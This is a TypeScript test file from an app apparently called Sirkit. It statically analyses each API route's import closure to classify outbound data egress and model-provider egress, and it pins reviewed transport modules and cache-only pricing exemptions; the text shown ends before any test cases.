/**
 * [B23-A2] The route vocabulary (OD-174, D23-9). `RoutePolicy` gains two explicit booleans, `externalTransfer` (design or part files
 * leave Sirkit through the row) and `spend` (the row can spend money), with gates: such rows are human-only (no automation role, a
 * trusted human session), CSRF-checked, never public and never open to a viewer or a commenter; no `spend` row may exist in B23; a
 * transfer row never reuses `releaseOrQualification`, whose two-row pin (b16-0-1-ci-gates.test.ts:186-196) stays as it is. The B16.0.2
 * resource classification gains `outboundEgress`, a closed vocabulary - `none`, `observation-query` or `files` - DERIVED here from
 * each route's runtime import closure reaching the egress boundary `app/lib/net/outbound-fetch.ts`, the way `b22-a2-process-census`
 * case 3 derives `external_process` (which stays green: its column stays at index 6). The five public cache-only BOM routes reach
 * the boundary only through the pricing gateway, which calls a vendor only for `live: true`; each is a reviewed exemption that holds
 * by reachability and by its own calls, or is dropped. No route sends files in A2 and no route is added: the census stays
 * 165 / 162 / 3 / 0 (the provider exchange route is B23-B1's). [B23-B1, 2026-10-03] B1 added it: 166 / 163 / 3 / 0, its row declares `files`.
 *
 * [B23-A2 review] `outboundEgress` sees only the egress boundary. The model-provider SDKs (OpenAI, Anthropic) open their own
 * connections (discovery section 2.3), so a route that sends a prompt or an embedding input to the configured LLM provider is
 * `none` there. The classification therefore carries `modelEgress` too, derived from each route's closure reaching a module that
 * imports a model SDK at run time; a transport census pins every module a route can reach that can open a connection at all,
 * so a row sends nothing out of Sirkit exactly when it is `none` and not `modelEgress` (Sirkit's own Supabase and Postgres store
 * aside). The pricing gateway's own edges are pinned too, so a live call added inside it costs every cache-only exemption.
 *
 * Nothing is written to disk; no route is called.
 */
import { readFileSync } from "node:fs";
import { join, relative } from "node:path";
import ts from "typescript";
import { describe, expect, it } from "vitest";
import { ROUTE_VOCABULARY_VIOLATIONS, allRoutePolicies, policyFor, routeVocabularyViolations, type RoutePolicy } from "@/app/lib/auth/route-policy";
import { OUTBOUND_EGRESS, PUBLIC_MODEL_EGRESS, outboundEgressViolations, renderRouteResourceClassificationCsv, routeResourceClassification, type OutboundEgress } from "@/app/lib/auth/route-resource-classification";
import { listRouteFiles, routePathOf } from "@/app/lib/auth/route-tree";
import { collectProductionFiles, moduleReferences, resolveSpecifier, type FileMap } from "@/app/lib/project/__tests__/_import-gate-helpers";
import { fileOf, importClosure, runtimeDeclarationSpecifiers } from "@/app/lib/mcp/server/__tests__/_import-closure";

const ROOT = process.cwd();
const NEWLINE = String.fromCharCode(10);
const read = (path: string): string => readFileSync(join(ROOT, path), "utf8").replaceAll(`${String.fromCharCode(13)}${NEWLINE}`, NEWLINE);
const CSV = "artifacts/ai-control-plane-b16-0-2/route-data-and-resource-classification.csv";
/** The egress boundary every acquisition, MCP and SchGen call goes through (discovery section 2.3). [B23-A2 review] It is not the
 *  only way out: the model-provider SDKs and Supabase use their own transports (2.3), which the transport census below pins. */
const EGRESS = "app/lib/net/outbound-fetch.ts";
/** The pricing gateway: the BOM builder and the build it wraps. A vendor is asked only for `live: true`. */
const GATEWAYS = ["app/lib/bom-builder.ts", "app/lib/bom/build.ts"] as const;
const PRICING = new Set(["buildBomRows", "buildBom"]);
/** [B23-A2 review tests-3] The gateway's own edges: the builder's one runtime import is the build; the build reaches the boundary
 *  only through the distributor index, imports exactly these names from it, and makes the one pricing call below (the other four
 *  names read the source registry's pause and status state: INFERRED free of egress, they take no `live` option). */
const DISTRIBUTOR_INDEX = "app/lib/distributors/index.ts";
const BUILD_INDEX_NAMES = ["getPricingFor", "pausedSources", "pricingKey", "pricingSourceStatuses", "unavailableSources"];
const PRICING_CALL = "getPricingFor(partsForPricing, pricingChoice, { live: pricing.live === true, forceRefresh: pricing.forceRefresh === true })";

/** [B23-A2 review] The model-provider SDKs: a module that imports one at run time can send a prompt or an embedding input out of
 *  Sirkit to the configured LLM provider, through the SDK's own transport. */
const MODEL_SDKS = ["openai", "@anthropic-ai/sdk"] as const;
/** Every other package that can open a connection: Sirkit's own store and identity, and the raw network modules. */
const NETWORK_PACKAGES = ["@supabase/ssr", "@supabase/supabase-js", "postgres", "pg", "undici", "axios", "node-fetch", "ws", "nodemailer", "http", "https", "http2", "net", "tls", "dgram", "node:http", "node:https", "node:http2", "node:net", "node:tls", "node:dgram"] as const;
type TransportKind = "egress-boundary" | "model-provider" | "own-store" | "same-origin" | "no-connection";
/** [B23-A2 review regressions-1] Reviewed: every module some route's runtime closure reaches that holds a connection primitive (a
 *  runtime import of a model SDK or a network package, or a global fetch), one kind and reason each. A new one fails case 8. [B23-A2 lead, 2026-10-02] Each also pins its exact primitive list (`transportsOf`) and its number of connection sites (`connectionSites`), so a new connection in an ALREADY-reviewed module fails case 8 too; a no-connection module holds no site, and only it. */
const TRANSPORTS: Readonly<Record<string, { readonly kind: TransportKind; readonly primitives: readonly string[]; readonly sites: number; readonly reason: string }>> = {
  "app/lib/net/outbound-fetch.ts": { kind: "egress-boundary", primitives: ["fetch"], sites: 1, reason: "the egress boundary: the host allowlist, the public-address check, the deadline and the bounded reader; the observation-query column" },
  "app/lib/agent/adapters.ts": { kind: "model-provider", primitives: ["@anthropic-ai/sdk", "openai"], sites: 2, reason: "the agent loop's OpenAI and Anthropic adapters: the model prompt with the run's context" },
  "app/lib/embeddings.ts": { kind: "model-provider", primitives: ["openai"], sites: 1, reason: "OpenAI embeddings: the text to embed (a catalogue query, part descriptions)" },
  "app/lib/llm/anthropic-provider.ts": { kind: "model-provider", primitives: ["@anthropic-ai/sdk"], sites: 1, reason: "the LLM router's Anthropic provider: the prompt" },
  "app/lib/llm/openai-provider.ts": { kind: "model-provider", primitives: ["openai"], sites: 1, reason: "the LLM router's OpenAI provider: the prompt" },
  "app/lib/parts-search.ts": { kind: "model-provider", primitives: ["@anthropic-ai/sdk"], sites: 1, reason: "the Anthropic part-search assist: the query" },
  "app/lib/auth/identity-provider.ts": { kind: "own-store", primitives: ["@supabase/ssr"], sites: 1, reason: "imports @supabase/ssr dynamically: session verification against Sirkit's own Supabase project, never a third party in this vocabulary" },
  "app/lib/auth/bounded-fetch.ts": { kind: "own-store", primitives: ["fetch"], sites: 1, reason: "the bounded fetch the Supabase client is given as its transport (Sirkit's own Supabase project)" },
  "app/lib/pcb/netlist-bridge.ts": { kind: "same-origin", primitives: ["fetch"], sites: 2, reason: "the browser-side footprint resolver: relative fetches to Sirkit's own /api/pcb/footprints routes" },
  "app/lib/project/membership-reauthorization.ts": { kind: "same-origin", primitives: ["fetch"], sites: 1, reason: "the browser-side re-authorization: a relative fetch to Sirkit's own /api/pcb/apply-authorization route" },
  "app/lib/db/client.ts": { kind: "own-store", primitives: ["postgres"], sites: 1, reason: "Sirkit's own Postgres database (the durable_access column)" },
  "app/api/auth/callback/route.ts": { kind: "own-store", primitives: ["@supabase/ssr"], sites: 1, reason: "the PKCE code exchange with Sirkit's own Supabase project" },
  "app/api/auth/signin/route.ts": { kind: "own-store", primitives: ["@supabase/ssr"], sites: 1, reason: "credential verification against Sirkit's own Supabase project" },
  "app/api/auth/signout/route.ts": { kind: "own-store", primitives: ["@supabase/ssr"], sites: 1, reason: "session revocation with Sirkit's own Supabase project" },
  "app/lib/net/ip-policy.ts": { kind: "no-connection", primitives: ["node:net"], sites: 0, reason: "imports isIP from node:net only: it classifies an address and opens nothing" },
};

interface CacheOnly { readonly names: readonly string[]; readonly calls: readonly string[]; readonly reason: string }
const CACHE_ONLY_REASON = "public and cache-only (OD-31): its closure reaches the egress boundary only through the pricing gateway, which it calls without a pricing grant (two arguments); the gateway asks a vendor only for live: true (distributors/index.ts: const livePricing = opts.live === true; B19-B I2, behaviour pinned by b19-bom-quota.test.ts:75)";
const CART: CacheOnly = { names: ["bomStateRefusal", "buildBomRows", "checkBomState", "normalizeChoice"], calls: ["buildBomRows"], reason: CACHE_ONLY_REASON };
/** [B23-A2] Reviewed: routes whose closure reaches the egress boundary but which never send anything (one reason each). */
const CACHE_ONLY: Readonly<Record<string, CacheOnly>> = {
  "/api/bom/cart/digikey": CART,
  "/api/bom/cart/lcsc": CART,
  "/api/bom/cart/mouser": CART,
  "/api/bom/procurement-packet": CART,
  "/api/bom/export-csv": { names: ["bomStateRefusal", "bomToCsv", "buildBom", "checkBomState"], calls: ["buildBom"], reason: CACHE_ONLY_REASON },
};
/** The paths that send an observation query today (each reaches the boundary and holds no exemption). */
const QUERY_PATHS = ["/api/bom", "/api/bom/diff", "/api/bom/snapshot", "/api/chat", "/api/parts/external-search", "/api/schematic/cross-verify"]; const TRANSFER_PATHS: ReadonlySet<string> = new Set(["/api/pcb/provider-exchange"]); // [B23-B1, 2026-10-03] the transfer paths are declared by their policy rows: `files`, never derived (OD-182 (a)). [B23-B1 review, 2026-10-04] tests-5: a reviewed literal, not the policy flag, so case 4 checks the flag's files row against a list it does not read

const edgeCache = new WeakMap<FileMap, Map<string, string[]>>();
/** A file's runtime import edges to production files: the rule `importClosure` follows (type-only declarations erased). */
function edgesOf(files: FileMap, file: string): string[] {
  let cache = edgeCache.get(files);
  if (cache === undefined) {
    cache = new Map();
    edgeCache.set(files, cache);
  }
  const cached = cache.get(file);
  if (cached !== undefined) return cached;
  const source = files.get(file)!;
  const runtime = runtimeDeclarationSpecifiers(file, source);
  const edges: string[] = [];
  for (const reference of moduleReferences(file, source)) {
    if (reference.kind === "import-type") continue;
    if ((reference.kind === "static-import" || reference.kind === "re-export") && !runtime.has(reference.specifier)) continue;
    const resolution = resolveSpecifier(file, reference.specifier);
    if (resolution.kind !== "module") continue;
    const target = fileOf(files, resolution.module);
    if (target !== null && !edges.includes(target)) edges.push(target);
  }
  cache.set(file, edges);
  return edges;
}
/** The runtime import closure of one entry; a bridge is neither walked through nor reached. */
function closureOf(files: FileMap, entry: string, bridges: ReadonlySet<string> = new Set()): Set<string> {
  const seen = new Set([entry]);
  const queue = [entry];
  while (queue.length > 0) {
    const file = queue.shift()!;
    for (const target of edgesOf(files, file)) {
      if (seen.has(target) || bridges.has(target)) continue;
      seen.add(target);
      queue.push(target);
    }
  }
  return seen;
}
const toTarget = (files: FileMap, file: string, specifier: string, targets: readonly string[]): string | null => {
  const resolution = resolveSpecifier(file, specifier);
  if (resolution.kind !== "module") return null;
  const target = fileOf(files, resolution.module);
  return target !== null && targets.includes(target) ? target : null;
};

/** What `file` imports from the gateway by name (local alias -> imported name), and every form that names no binding. */
const gatewayImports = (files: FileMap, file: string): { names: string[]; locals: Map<string, string>; opaque: string[] } => namedImportsFrom(files, file, GATEWAYS);
/** What `file` imports from `targets` by name (local alias -> imported name), and every form that names no binding. */
function namedImportsFrom(files: FileMap, file: string, targets: readonly string[]): { names: string[]; locals: Map<string, string>; opaque: string[] } {
  const toGateway = (from: FileMap, path: string, specifier: string): string | null => toTarget(from, path, specifier, targets);
  const source = files.get(file)!;
  const parsed = ts.createSourceFile(file, source, ts.ScriptTarget.Latest, true, file.endsWith("x") ? ts.ScriptKind.TSX : ts.ScriptKind.TS);
  const names: string[] = [];
  const locals = new Map<string, string>();
  const opaque: string[] = [];
  for (const statement of parsed.statements) {
    if (ts.isImportDeclaration(statement) && ts.isStringLiteralLike(statement.moduleSpecifier) && toGateway(files, file, statement.moduleSpecifier.text) !== null) {
      const clause = statement.importClause;
      if (clause === undefined) { opaque.push("bare-import"); continue; }
      if (clause.isTypeOnly) continue;
      if (clause.name !== undefined) opaque.push("default-import");
      const bindings = clause.namedBindings;
      if (bindings !== undefined && ts.isNamespaceImport(bindings)) opaque.push("namespace-import");
      else if (bindings !== undefined) {
        for (const element of bindings.elements) {
          if (element.isTypeOnly) continue;
          const imported = (element.propertyName ?? element.name).text;
          names.push(imported);
          locals.set(element.name.text, imported);
        }
      }
    } else if (ts.isExportDeclaration(statement) && statement.moduleSpecifier !== undefined && ts.isStringLiteralLike(statement.moduleSpecifier) && toGateway(files, file, statement.moduleSpecifier.text) !== null && !statement.isTypeOnly) {
      opaque.push("re-export");
    }
  }
  for (const reference of moduleReferences(file, source)) {
    if ((reference.kind === "dynamic-import" || reference.kind === "require" || reference.kind === "import-equals") && toGateway(files, file, reference.specifier) !== null) opaque.push(reference.kind);
  }
  return { names: [...new Set(names)].sort(), locals, opaque };
}

/** Every reference to an imported pricing function: a call with at most two arguments and no spread (no pricing grant), or a violation. */
function pricingCalls(files: FileMap, file: string, locals: ReadonlyMap<string, string>): { calls: string[]; violations: string[] } {
  const parsed = ts.createSourceFile(file, files.get(file)!, ts.ScriptTarget.Latest, true, file.endsWith("x") ? ts.ScriptKind.TSX : ts.ScriptKind.TS);
  const calls: string[] = [];
  const violations: string[] = [];
  const visit = (node: ts.Node): void => {
    if (ts.isImportDeclaration(node)) return;
    if (ts.isIdentifier(node) && locals.has(node.text) && PRICING.has(locals.get(node.text)!)) {
      const name = locals.get(node.text)!;
      const parent = node.parent;
      if (ts.isCallExpression(parent) && parent.expression === node) {
        calls.push(name);
        if (parent.arguments.length > 2 || parent.arguments.some((argument) => ts.isSpreadElement(argument))) violations.push(`PRICING_GRANT:${name}`);
      } else violations.push(`OPAQUE_USE:${name}`);
    }
    ts.forEachChild(node, visit);
  };
  visit(parsed);
  return { calls: [...new Set(calls)].sort(), violations };
}

/** Every reason a reviewed cache-only exemption does not hold for the route `file` (empty when it holds). */
function exemptionViolations(files: FileMap, file: string, exemption: CacheOnly): string[] {
  const out: string[] = [];
  const bridged = closureOf(files, file, new Set(GATEWAYS));
  if (bridged.has(EGRESS)) out.push("AROUND_THE_GATEWAY");
  for (const member of bridged) {
    if (member === file) continue;
    if (edgesOf(files, member).some((target) => (GATEWAYS as readonly string[]).includes(target))) out.push(`GATEWAY_IMPORTER:${member}`);
  }
  const imports = gatewayImports(files, file);
  for (const kind of imports.opaque) out.push(`OPAQUE_GATEWAY_USE:${kind}`);
  for (const name of imports.names) if (!exemption.names.includes(name)) out.push(`UNREVIEWED_IMPORT:${name}`);
  const { calls, violations } = pricingCalls(files, file, imports.locals);
  out.push(...violations);
  if (calls.join(",") !== [...exemption.calls].sort().join(",")) out.push(`ROUTE_CALLS:${calls.join(",")}`);
  out.push(...gatewayViolations(files)); // [B23-A2 review tests-3] the gateway's own edges hold too, or no route is cache-only
  return out;
}

const gatewayCache = new WeakMap<FileMap, string[]>();
/** [B23-A2 review tests-3] Every reason the pricing gateway itself may ask a vendor beyond its one pinned call (empty: it may not).
 *  The route checks above bridge the gateway, so they never see a live call added inside it. */
function gatewayViolations(files: FileMap): string[] {
  const cached = gatewayCache.get(files);
  if (cached !== undefined) return cached;
  const out: string[] = [];
  const [builder, build] = GATEWAYS;
  const builderEdges = edgesOf(files, builder);
  if (builderEdges.join(",") !== build) out.push(`BUILDER_EDGES:${builderEdges.join(",")}`);
  const gateway = closureOf(files, builder, new Set([DISTRIBUTOR_INDEX]));
  if (gateway.has(EGRESS)) out.push("AROUND_THE_INDEX");
  for (const member of gateway) if (member !== build && edgesOf(files, member).includes(DISTRIBUTOR_INDEX)) out.push(`INDEX_IMPORTER:${member}`);
  const imports = namedImportsFrom(files, build, [DISTRIBUTOR_INDEX]);
  for (const kind of imports.opaque) out.push(`OPAQUE_INDEX_USE:${kind}`);
  for (const name of imports.names) if (!BUILD_INDEX_NAMES.includes(name)) out.push(`UNREVIEWED_INDEX_IMPORT:${name}`);
  for (const [local, imported] of imports.locals) if (local !== imported) out.push(`ALIASED_INDEX_IMPORT:${imported}`);
  const parsed = ts.createSourceFile(build, files.get(build)!, ts.ScriptTarget.Latest, true, ts.ScriptKind.TS);
  const pricing: string[] = [];
  const visit = (node: ts.Node): void => {
    if (ts.isImportDeclaration(node)) return;
    if (ts.isIdentifier(node) && node.text === "getPricingFor") pricing.push(ts.isCallExpression(node.parent) && node.parent.expression === node ? node.parent.getText(parsed).replace(/\s+/g, " ") : "OPAQUE");
    ts.forEachChild(node, visit);
  };
  visit(parsed);
  if (pricing.join("|") !== PRICING_CALL) out.push(`PRICING_CALLS:${pricing.length}`);
  gatewayCache.set(files, out);
  return out;
}

const transportCache = new WeakMap<FileMap, Map<string, readonly string[]>>();
/** [B23-A2 review regressions-1] The connection primitives `file` holds: a runtime import of a model SDK or a network package
 *  (static, re-export, require or dynamic; a type-only import is erased), and a global fetch (a bare `fetch(...)` call, or a
 *  `globalThis.fetch`-style reference). A local function named `fetch` is reported too, and reviewed. */
function transportsOf(files: FileMap, file: string): readonly string[] {
  let cache = transportCache.get(files);
  if (cache === undefined) {
    cache = new Map();
    transportCache.set(files, cache);
  }
  const cached = cache.get(file);
  if (cached !== undefined) return cached;
  const source = files.get(file)!;
  const runtime = runtimeDeclarationSpecifiers(file, source);
  const found = new Set<string>();
  for (const reference of moduleReferences(file, source)) {
    if (reference.kind === "import-type") continue;
    if ((reference.kind === "static-import" || reference.kind === "re-export") && !runtime.has(reference.specifier)) continue;
    if (resolveSpecifier(file, reference.specifier).kind !== "bare") continue;
    const name = [...MODEL_SDKS, ...NETWORK_PACKAGES].find((pkg) => reference.specifier === pkg || reference.specifier.startsWith(`${pkg}/`));
    if (name !== undefined) found.add(name);
  }
  const parsed = ts.createSourceFile(file, source, ts.ScriptTarget.Latest, true, file.endsWith("x") ? ts.ScriptKind.TSX : ts.ScriptKind.TS);
  const visit = (node: ts.Node): void => {
    if (ts.isCallExpression(node) && ts.isIdentifier(node.expression) && node.expression.text === "fetch") found.add("fetch");
    if (ts.isPropertyAccessExpression(node) && node.name.text === "fetch" && ts.isIdentifier(node.expression) && ["globalThis", "window", "self", "global"].includes(node.expression.text)) found.add("fetch");
    ts.forEachChild(node, visit);
  };
  visit(parsed);
  const out = [...found].sort();
  cache.set(file, out);
  return out;
}
/** [B23-A2 review] The global fetch calls in `file` whose first argument is not a Sirkit path: a string or template literal
 *  beginning with "/", or a top-level constant initialised to one (empty: every call is same-origin). */
function crossOriginFetches(files: FileMap, file: string): string[] {
  const parsed = ts.createSourceFile(file, files.get(file)!, ts.ScriptTarget.Latest, true, file.endsWith("x") ? ts.ScriptKind.TSX : ts.ScriptKind.TS);
  const constants = new Map<string, ts.Expression>();
  for (const statement of parsed.statements) {
    if (!ts.isVariableStatement(statement)) continue;
    for (const declaration of statement.declarationList.declarations) if (ts.isIdentifier(declaration.name) && declaration.initializer !== undefined) constants.set(declaration.name.text, declaration.initializer);
  }
  const sirkitPath = (expression: ts.Expression | undefined): boolean => {
    if (expression === undefined) return false;
    if (ts.isAsExpression(expression) || ts.isParenthesizedExpression(expression)) return sirkitPath(expression.expression);
    if (ts.isStringLiteralLike(expression)) return expression.text.startsWith("/") && !expression.text.startsWith("//");
    if (ts.isTemplateExpression(expression)) return expression.head.text.startsWith("/") && !expression.head.text.startsWith("//");
    if (ts.isIdentifier(expression) && constants.has(expression.text)) return sirkitPath(constants.get(expression.text));
    return false;
  };
  const out: string[] = [];
  const visit = (node: ts.Node): void => {
    if (ts.isCallExpression(node) && ts.isIdentifier(node.expression) && node.expression.text === "fetch" && !sirkitPath(node.arguments[0])) out.push(`fetch(${node.arguments[0]?.getText(parsed) ?? ""})`);
    if (ts.isPropertyAccessExpression(node) && node.name.text === "fetch" && ts.isIdentifier(node.expression) && ["globalThis", "window", "self", "global"].includes(node.expression.text)) out.push(`${node.expression.text}.fetch`);
    ts.forEachChild(node, visit);
  };
  visit(parsed);
  return out;
}

/**
 * [B23-A2 review regressions-1] Which runtime bindings can send a model input: a binding-level reference walk, because module
 * reachability says nothing here - the DB schema imports the embedding module's dimension constant, so nearly every route's closure
 * reaches an OpenAI client it never calls. Seeds: every local bound to a model SDK import. A top-level declaration that references a
 * sending local is sending; an imported binding is sending when the export it names is (a namespace import, `export *` or a dynamic
 * import when any export is); a module SENDS AT IMPORT when its import-time code (a top-level statement, or a non-function initializer)
 * calls a sending binding (constructing one with `new` sends nothing). A route sends a model input when one of its handler exports
 * is sending or a module in its closure sends at import. References are names, never runtime values: an over-approximation within
 * a module (shadowing is ignored), INFERRED sound across modules for code that passes functions by import.
 */
interface ModuleFacts {
  imports: Map<string, { target: string | null; bare: string | null; imported: string }>;
  decls: Map<string, { refs: Set<string>; dynamic: string[]; importCalls: Set<string> }>;
  importLevel: { refs: Set<string>; dynamic: string[]; importCalls: Set<string> };
  exports: Map<string, string>;
  reexports: Array<{ target: string; imported: string; exported: string }>;
  stars: string[];
}
const factsCache = new WeakMap<FileMap, Map<string, ModuleFacts>>();
function factsOf(files: FileMap, file: string): ModuleFacts {
  let cache = factsCache.get(files);
  if (cache === undefined) {
    cache = new Map();
    factsCache.set(files, cache);
  }
  const cached = cache.get(file);
  if (cached !== undefined) return cached;
  const parsed = ts.createSourceFile(file, files.get(file)!, ts.ScriptTarget.Latest, true, file.endsWith("x") ? ts.ScriptKind.TSX : ts.ScriptKind.TS);
  const targetOf = (specifier: string): string | null => {
    const resolution = resolveSpecifier(file, specifier);
    return resolution.kind === "module" ? fileOf(files, resolution.module) : null;
  };
  const isFunctionLike = (node: ts.Node | undefined): boolean => node !== undefined && (ts.isArrowFunction(node) || ts.isFunctionExpression(node) || ((ts.isAsExpression(node) || ts.isSatisfiesExpression(node) || ts.isParenthesizedExpression(node)) && isFunctionLike(node.expression)));
  /** Every name `node` references (types, property keys and accessed member names aside), its dynamic import targets, and the
   *  root names it CALLS at import time (outside any nested function). */
  const scan = (node: ts.Node, atImport: boolean): { refs: Set<string>; dynamic: string[]; importCalls: Set<string> } => {
    const refs = new Set<string>();
    const dynamic: string[] = [];
    const importCalls = new Set<string>();
    const rootOf = (expression: ts.Expression): string | null => {
      if (ts.isIdentifier(expression)) return expression.text;
      if (ts.isPropertyAccessExpression(expression) || ts.isElementAccessExpression(expression) || ts.isCallExpression(expression) || ts.isNonNullExpression(expression) || ts.isParenthesizedExpression(expression) || ts.isAwaitExpression(expression)) return rootOf(expression.expression);
      return null;
    };
    const walk = (current: ts.Node, running: boolean): void => {
      if (ts.isTypeNode(current) || ts.isInterfaceDeclaration(current) || ts.isTypeAliasDeclaration(current)) return;
      if (ts.isIdentifier(current)) {
        const parent = current.parent;
        const isKey = (ts.isPropertyAccessExpression(parent) && parent.name === current) || ((ts.isPropertyAssignment(parent) || ts.isMethodDeclaration(parent) || ts.isPropertyDeclaration(parent) || ts.isGetAccessorDeclaration(parent) || ts.isSetAccessorDeclaration(parent)) && parent.name === current);
        if (!isKey) refs.add(current.text);
      }
      if (ts.isCallExpression(current)) {
        const argument = current.arguments[0];
        if ((current.expression.kind === ts.SyntaxKind.ImportKeyword || (ts.isIdentifier(current.expression) && current.expression.text === "require")) && argument !== undefined && ts.isStringLiteralLike(argument)) {
          const target = targetOf(argument.text);
          if (target !== null) dynamic.push(target);
        }
        if (running) {
          const root = rootOf(current.expression);
          if (root !== null) importCalls.add(root);
        }
      }
      const nested = running && (ts.isFunctionLike(current) || ts.isClassLike(current));
      ts.forEachChild(current, (child) => walk(child, running && !nested));
    };
    walk(node, atImport);
    return { refs, dynamic, importCalls };
  };
  const facts: ModuleFacts = { imports: new Map(), decls: new Map(), importLevel: { refs: new Set(), dynamic: [], importCalls: new Set() }, exports: new Map(), reexports: [], stars: [] };
  const exported = (node: ts.Node): boolean => ts.canHaveModifiers(node) && (ts.getModifiers(node) ?? []).some((modifier) => modifier.kind === ts.SyntaxKind.ExportKeyword);
  const isDefault = (node: ts.Node): boolean => ts.canHaveModifiers(node) && (ts.getModifiers(node) ?? []).some((modifier) => modifier.kind === ts.SyntaxKind.DefaultKeyword);
  for (const statement of parsed.statements) {
    if (ts.isImportDeclaration(statement)) {
      const clause = statement.importClause;
      if (clause === undefined || clause.isTypeOnly || !ts.isStringLiteralLike(statement.moduleSpecifier)) continue;
      const specifier = statement.moduleSpecifier.text;
      const source = { target: targetOf(specifier), bare: resolveSpecifier(file, specifier).kind === "bare" ? specifier : null };
      if (clause.name !== undefined) facts.imports.set(clause.name.text, { ...source, imported: "default" });
      const bindings = clause.namedBindings;
      if (bindings !== undefined && ts.isNamespaceImport(bindings)) facts.imports.set(bindings.name.text, { ...source, imported: "*" });
      else if (bindings !== undefined) for (const element of bindings.elements) if (!element.isTypeOnly) facts.imports.set(element.name.text, { ...source, imported: (element.propertyName ?? element.name).text });
    } else if (ts.isImportEqualsDeclaration(statement)) {
      const reference = statement.moduleReference;
      if (!statement.isTypeOnly && ts.isExternalModuleReference(reference) && ts.isStringLiteralLike(reference.expression)) {
        facts.imports.set(statement.name.text, { target: targetOf(reference.expression.text), bare: resolveSpecifier(file, reference.expression.text).kind === "bare" ? reference.expression.text : null, imported: "*" });
      }
    } else if (ts.isExportDeclaration(statement)) {
      if (statement.isTypeOnly) continue;
      const clause = statement.exportClause;
      if (statement.moduleSpecifier !== undefined && ts.isStringLiteralLike(statement.moduleSpecifier)) {
        const target = targetOf(statement.moduleSpecifier.text);
        if (target === null) continue;
        if (clause === undefined) facts.stars.push(target);
        else if (ts.isNamespaceExport(clause)) facts.reexports.push({ target, imported: "*", exported: clause.name.text });
        else for (const element of clause.elements) if (!element.isTypeOnly) facts.reexports.push({ target, imported: (element.propertyName ?? element.name).text, exported: element.name.text });
      } else if (clause !== undefined && ts.isNamedExports(clause)) {
        for (const element of clause.elements) if (!element.isTypeOnly) facts.exports.set(element.name.text, (element.propertyName ?? element.name).text);
      }
    } else if (ts.isExportAssignment(statement)) {
      facts.decls.set("default", scan(statement.expression, !isFunctionLike(statement.expression)));
      facts.exports.set("default", "default");
    } else if (ts.isFunctionDeclaration(statement) || ts.isClassDeclaration(statement) || ts.isEnumDeclaration(statement)) {
      const name = statement.name?.text ?? "default";
      facts.decls.set(name, scan(statement, ts.isEnumDeclaration(statement)));
      if (exported(statement)) facts.exports.set(isDefault(statement) ? "default" : name, name);
    } else if (ts.isVariableStatement(statement)) {
      for (const declaration of statement.declarationList.declarations) {
        const scanned = declaration.initializer === undefined ? { refs: new Set<string>(), dynamic: [], importCalls: new Set<string>() } : scan(declaration.initializer, !isFunctionLike(declaration.initializer));
        const names: string[] = [];
        const bind = (name: ts.BindingName): void => {
          if (ts.isIdentifier(name)) names.push(name.text);
          else for (const element of name.elements) if (!ts.isOmittedExpression(element)) bind(element.name);
        };
        bind(declaration.name);
        for (const name of names) {
          facts.decls.set(name, scanned);
          if (exported(statement)) facts.exports.set(name, name);
        }
      }
    } else if (!ts.isInterfaceDeclaration(statement) && !ts.isTypeAliasDeclaration(statement) && !ts.isModuleDeclaration(statement)) {
      const scanned = scan(statement, true);
      for (const ref of scanned.refs) facts.importLevel.refs.add(ref);
      facts.importLevel.dynamic.push(...scanned.dynamic);
      for (const call of scanned.importCalls) facts.importLevel.importCalls.add(call);
    }
  }
  cache.set(file, facts);
  return facts;
}

/** The sending locals of every module in `universe` and the modules that send at import (the fixpoint described above). */
function modelSending(files: FileMap, universe: ReadonlySet<string>): { sending: Map<string, Set<string>>; atImport: Set<string>; exportSending: (file: string, name: string) => boolean } {
  const sending = new Map<string, Set<string>>();
  for (const file of universe) {
    const local = new Set<string>();
    for (const [name, source] of factsOf(files, file).imports) if (source.bare !== null && (MODEL_SDKS as readonly string[]).some((sdk) => source.bare === sdk || source.bare!.startsWith(`${sdk}/`))) local.add(name);
    sending.set(file, local);
  }
  const atImport = new Set<string>();
  const exportSending = (file: string, name: string, seen: Set<string> = new Set()): boolean => {
    const key = `${file}#${name}`;
    if (seen.has(key) || !universe.has(file)) return false;
    seen.add(key);
    const facts = factsOf(files, file);
    const local = facts.exports.get(name);
    if (local !== undefined && sending.get(file)!.has(local)) return true;
    for (const entry of facts.reexports) if (entry.exported === name && (entry.imported === "*" ? anySending(entry.target, seen) : exportSending(entry.target, entry.imported, seen))) return true;
    return name !== "default" && facts.stars.some((target) => exportSending(target, name, seen));
  };
  const anySending = (file: string, seen: Set<string> = new Set()): boolean => {
    if (!universe.has(file)) return false;
    const facts = factsOf(files, file);
    const names = new Set([...facts.exports.keys(), ...facts.reexports.map((entry) => entry.exported)]);
    if ([...names].some((name) => exportSending(file, name, seen))) return true;
    const key = `${file}#*`;
    if (seen.has(key)) return false;
    seen.add(key);
    return facts.stars.some((target) => anySending(target, seen));
  };
  for (let changed = true; changed;) {
    changed = false;
    for (const file of universe) {
      const facts = factsOf(files, file);
      const local = sending.get(file)!;
      const mark = (name: string): void => {
        if (!local.has(name)) { local.add(name); changed = true; }
      };
      for (const [name, source] of facts.imports) if (!local.has(name) && source.target !== null && (source.imported === "*" ? anySending(source.target) : exportSending(source.target, source.imported))) mark(name);
      for (const [name, decl] of facts.decls) if (!local.has(name) && ([...decl.refs].some((ref) => local.has(ref)) || decl.dynamic.some((target) => anySending(target)))) mark(name);
      const calls = [...facts.importLevel.importCalls, ...[...facts.decls.values()].flatMap((decl) => [...decl.importCalls])];
      if (!atImport.has(file) && (calls.some((call) => local.has(call)) || facts.importLevel.dynamic.some((target) => anySending(target)))) { atImport.add(file); changed = true; }
    }
  }
  return { sending, atImport, exportSending: (file, name) => exportSending(file, name) };
}
/** [B23-A2 review regressions-1] Each route's model egress: a sending handler export, or a closure module that sends at import. */
function modelEgressOf(files: FileMap, routes: ReadonlyArray<{ path: string; file: string }>): Map<string, boolean> {
  const closures = new Map(routes.map(({ file }) => [file, closureOf(files, file)] as const));
  const universe = new Set([...closures.values()].flatMap((closure) => [...closure]));
  const { atImport, exportSending } = modelSending(files, universe);
  const out = new Map<string, boolean>();
  for (const { path, file } of routes) {
    const handlers = [...factsOf(files, file).exports.keys(), ...factsOf(files, file).reexports.map((entry) => entry.exported)];
    out.set(path, handlers.some((name) => exportSending(file, name)) || [...closures.get(file)!].some((member) => atImport.has(member)));
  }
  return out;
}

interface EgressRow { path: string; file: string; reached: boolean; exempt: boolean; derived: OutboundEgress; value: OutboundEgress; modelEgress: boolean } // [B23-B1 review, 2026-10-04] derived: from the closure alone
